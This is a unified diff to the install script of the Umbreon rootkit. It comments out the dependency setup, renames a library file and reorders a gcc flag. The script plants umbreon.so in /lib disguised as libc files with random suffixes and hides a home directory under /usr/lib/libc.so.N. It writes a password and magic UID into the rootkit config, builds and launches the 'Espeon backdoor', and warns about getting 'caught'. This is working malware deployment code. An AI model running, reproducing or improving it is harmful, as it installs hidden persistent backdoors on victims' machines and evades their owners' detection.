@@ -1,19 +1,20 @@
 #!/bin/bash
 sh utils/ex/listen.sh
-if [ -f /usr/bin/yum ]; then
-  yes|yum install make gcc pam-devel openssl-devel libpcap libpcap-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 wget curl unzip zip strace
-elif [ -f /usr/bin/apt-get ] ; then
-  dpkg --add-architecture i386
-  if [ "$4" == "" ]; then
-    yes|apt-get update
-  fi
-  if [ `uname -m` == 'armv6l' ]; then
-    apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev build-essential wget curl unzip zip strace
-  else
-    apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev gcc-multilib build-essential wget curl unzip zip strace
-  fi
-  grep -i ubuntu /proc/version >&/dev/null  && apt-get --yes --force-yes install libssl-dev:i386 && rm -f /etc/init/plymouth* # lol wow
-fi
+# if [ -f /usr/bin/yum ]; then
+#   yes|yum install make gcc pam-devel openssl-devel libpcap libpcap-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 wget curl unzip zip strace
+# elif [ -f /usr/bin/apt-get ] ; then
+#   dpkg --add-architecture i386
+#   if [ "$4" == "" ]; then
+#     yes|apt-get update
+#   fi
+#   if [ `uname -m` == 'armv6l' ]; then
+#     apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev build-essential wget curl unzip zip strace
+#   else
+#     apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev gcc-multilib build-essential wget curl unzip zip strace
+#   fi
+#   grep -i ubuntu /proc/version >&/dev/null  && apt-get --yes --force-yes install libssl-dev:i386 && rm -f /etc/init/plymouth* # lol wow
+# fi
+echo "Installing."
 make distclean
 MAGICNUM=$(( ( ($RANDOM & 3)<<30 | $RANDOM<<15 | $RANDOM ) ))
 MAGICNUM2=$(( ( ($RANDOM & 3)<<30 | $RANDOM<<15 | $RANDOM ) ))
@@ -56,7 +57,7 @@ echo "Installing.."
 if [ `uname -m` == "armv6l" ]; then
 cp umbreon.so /lib/libc.so.$MAGICNUM2.v6l || echo "Fucked up big time. Box might not work now."
 else
-cp umbreon.so /lib/libc.so.$MAGICNUM2.x86_64 || echo "Fucked up big time. Box might not work now."
+cp umbreon.so /lib/libc.so.$MAGICNUM2.haswell || echo "Fucked up big time. Box might not work now."
 cp umbreon.so.i686 /lib/libc.so.$MAGICNUM2.i686 || echo "Could not install 32-bit library. This isn't fatal, but may get you caught later if someone runs a 32 bit program."
 fi
 mkdir -p "/usr/lib/libc.so.${MAGICNUM3}"
@@ -85,7 +86,7 @@ rm -rf /usr/lib/libc.so.${MAGICNUM3}/utils
 echo -e "cryptpass='${PWC}'\nhome='/usr/lib/libc.so.${MAGICNUM3}'\nmagic_uid=$MAGICNUM\n" >> /usr/lib/libc.so.${MAGICNUM3}/bin/umbreon.py
 cp utils/unhide-self.py /usr/lib/libc.so.${MAGICNUM3}/bin/.x
 cp .umbreon-ascii /usr/lib/libc.so.${MAGICNUM3}/.umbreon-ascii ; ./umbreon ; rm -rf umbreon
-gcc -lpcap -Iinc utils/espeon.c -o /usr/lib/libc.so.${MAGICNUM3}/bin/espeon 2>/dev/null
+gcc -Iinc utils/espeon.c -o /usr/lib/libc.so.${MAGICNUM3}/bin/espeon -lpcap 2>/dev/null
 
 if [ -d /proc/vz ]; then
      echo "Not launching Espeon backdoor; we are on OpenVZ and cannot packet capture reliably."
